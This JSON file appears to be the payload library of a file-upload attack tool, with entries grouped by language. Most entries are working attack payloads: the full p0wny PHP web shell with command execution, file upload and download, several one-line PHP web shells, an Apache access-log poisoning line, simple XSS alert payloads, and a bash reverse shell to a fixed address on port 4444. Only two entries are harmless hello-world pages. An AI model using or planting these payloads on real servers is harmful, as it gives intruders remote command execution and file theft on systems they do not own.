{
    "ploads": [
        {
            "php": [
                {
                    "name": "helloworld",
                    "content": "<?php echo 'Hello, World!'; ?>"
                },
                {
                    "name": "p0wny-webshell",
                    "content": "<?php\n\n$SHELL_CONFIG = array(\n    'username' => 'p0wny',\n    'hostname' => 'shell',\n);\n\nfunction expandPath($path) {\n    if (preg_match(\"#^(~[a-zA-Z0-9_.-]*)(/.*)?$#\", $path, $match)) {\n        exec(\"echo $match[1]\", $stdout);\n        return $stdout[0] . $match[2];\n    }\n    return $path;\n}\n\nfunction allFunctionExist($list = array()) {\n    foreach ($list as $entry) {\n        if (!function_exists($entry)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nfunction executeCommand($cmd) {\n    $output = '';\n    if (function_exists('exec')) {\n        exec($cmd, $output);\n        $output = implode(\"\\n\", $output);\n    } else if (function_exists('shell_exec')) {\n        $output = shell_exec($cmd);\n    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        system($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        passthru($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {\n        $handle = popen($cmd, 'r');\n        while (!feof($handle)) {\n            $output .= fread($handle, 4096);\n        }\n        pclose($handle);\n    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {\n        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);\n        $output = stream_get_contents($pipes[1]);\n        proc_close($handle);\n    }\n    return $output;\n}\n\nfunction isRunningWindows() {\n    return stripos(PHP_OS, \"WIN\") === 0;\n}\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = \"\";\n\n    if (preg_match(\"/^\\s*cd\\s*(2>&1)?$/\", $cmd)) {\n        chdir(expandPath(\"~\"));\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir(expandPath($match[1]));\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        $stdout = executeCommand($cmd);\n    }\n\n    return array(\n        \"stdout\" => base64_encode($stdout),\n        \"cwd\" => base64_encode(getcwd())\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => base64_encode(getcwd()));\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    foreach ($files as &$filename) {\n        $filename = base64_encode($filename);\n    }\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => base64_encode('File not found / no read permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        return array(\n            'name' => base64_encode(basename($filePath)),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => base64_encode('Invalid path / no write permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => base64_encode('Done.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    }\n}\n\nfunction initShellConfig() {\n    global $SHELL_CONFIG;\n\n    if (isRunningWindows()) {\n        $username = getenv('USERNAME');\n        if ($username !== false) {\n            $SHELL_CONFIG['username'] = $username;\n        }\n    } else {\n        $pwuid = posix_getpwuid(posix_geteuid());\n        if ($pwuid !== false) {\n            $SHELL_CONFIG['username'] = $pwuid['name'];\n        }\n    }\n\n    $hostname = gethostname();\n    if ($hostname !== false) {\n        $SHELL_CONFIG['hostname'] = $hostname;\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n} else {\n    initShellConfig();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n                width: 100vw;\n                height: 100vh;\n                overflow: hidden;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n                max-width: calc(100vw - 2 * var(--shell-margin));\n                max-height: calc(100vh - 2 * var(--shell-margin));\n                resize: both;\n                overflow: hidden;\n                width: 100%;\n                height: 100%;\n                margin: var(--shell-margin) auto;\n            }\n\n            #shell-content {\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            :root {\n                --shell-margin: 25px;\n            }\n\n            @media (min-width: 1200px) {\n                :root {\n                    --shell-margin: 50px !important;\n                }\n            }\n\n            @media (max-width: 991px),\n                   (max-height: 600px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n                :root {\n                    --shell-margin: 0 !important;\n                }\n                #shell {\n                    resize: none;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n                padding: 10px 0;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n                box-sizing: border-box;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(atob(response.name), response.file)\n                        } else {\n                            _insertStdout(atob(response.stdout));\n                            updateCwd(atob(response.cwd));\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n                    data.files = data.files.map(function(file){\n                        return atob(file);\n                    });\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(atob(response.stdout));\n                            updateCwd(atob(response.cwd));\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\u2026/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return SHELL_CONFIG[\"username\"] + \"@\" + SHELL_CONFIG[\"hostname\"] + \":<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = atob(response.cwd);\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n"
                },
                {
                    "name": "logger",
                    "content": "<?php file_put_contents('/var/log/apache2/access.log', $_GET['cmd']); ?>"
                },
                {
                    "name": "webshell_basic",
                    "content": "<?php system($_GET['cmd']); ?>"
                },
                {
                    "name": "webshell_interactif",
                    "content": "<?php if (!empty($_POST['cmd'])) $cmd = shell_exec($_POST['cmd']); ?><!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><title>Web Shell</title><style>*{box-sizing:border-box;}body{font-family:sans-serif;color:rgba(0,0,0,.75);}main{margin:auto;max-width:850px;}pre,input,button{padding:10px;border-radius:5px;background-color:#efefef;}label{display:block;}input{width:100%;background-color:#efefef;border:2px solid transparent;}input:focus{outline:none;background:transparent;border:2px solid #e6e6e6;}button{border:none;cursor:pointer;margin-left:5px;}button:hover{background-color:#e6e6e6;}.form-group{display:flex;padding:15px 0;}</style></head><body><main><h1>Web Shell</h1><h2>Execute a command</h2><form method=\"post\"><label for=\"cmd\"><strong>Command</strong></label><div class=\"form-group\"><input type=\"text\" name=\"cmd\" id=\"cmd\" value=\"<?=htmlspecialchars($_POST['cmd'],ENT_QUOTES,'UTF-8')?>\" onfocus=\"this.setSelectionRange(this.value.length,this.value.length);\" autofocus required><button type=\"submit\">Execute</button></div></form><?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?><h2>Output</h2><?php if (isset($cmd)): ?><pre><?=htmlspecialchars($cmd,ENT_QUOTES,'UTF-8')?></pre><?php else: ?><pre><small>No result.</small></pre><?php endif; ?><?php endif; ?></main></body></html>"
                }
            ]
        },
        {
            "js": [
                {
                    "name": "xss_script",
                    "content": "<script>alert('XSS');</script>"
                },
                {
                    "name": "xss_iframe",
                    "content": "<iframe src=javascript:alert('XSS')></iframe>"
                },
                {
                    "name": "xss_img",
                    "content": "<img src=x onerror=alert('XSS')>"
                }
            ]
        },
        {
            "bash": [
                {
                    "name": "reverse_shell",
                    "content": "bash -i >& /dev/tcp/192.168.1.29/4444 0>&1"
                }
            ]
        },
        {
            "html": [
                {
                    "name": "Hello_world",
                    "content": "<html><body><h1>Hello World !<br>WebPload Open !</h1></body></html>"
                },
                {
                    "name": "webshell_interactif_php",
                    "content": "<html><?php if (!empty($_POST['cmd'])) $cmd = shell_exec($_POST['cmd']); ?><!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><title>Web Shell</title><style>*{box-sizing:border-box;}body{font-family:sans-serif;color:rgba(0,0,0,.75);}main{margin:auto;max-width:850px;}pre,input,button{padding:10px;border-radius:5px;background-color:#efefef;}label{display:block;}input{width:100%;background-color:#efefef;border:2px solid transparent;}input:focus{outline:none;background:transparent;border:2px solid #e6e6e6;}button{border:none;cursor:pointer;margin-left:5px;}button:hover{background-color:#e6e6e6;}.form-group{display:flex;padding:15px 0;}</style></head><body><main><h1>Web Shell</h1><h2>Execute a command</h2><form method=\"post\"><label for=\"cmd\"><strong>Command</strong></label><div class=\"form-group\"><input type=\"text\" name=\"cmd\" id=\"cmd\" value=\"<?=htmlspecialchars($_POST['cmd'],ENT_QUOTES,'UTF-8')?>\" onfocus=\"this.setSelectionRange(this.value.length,this.value.length);\" autofocus required><button type=\"submit\">Execute</button></div></form><?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?><h2>Output</h2><?php if (isset($cmd)): ?><pre><?=htmlspecialchars($cmd,ENT_QUOTES,'UTF-8')?></pre><?php else: ?><pre><small>No result.</small></pre><?php endif; ?><?php endif; ?></main></body></html>"
                },
                {
                    "name": "webshell_php",
                    "content": "<html><?php system($_GET['cmd']); ?></html>"
                }
            ]
        }
    ]
}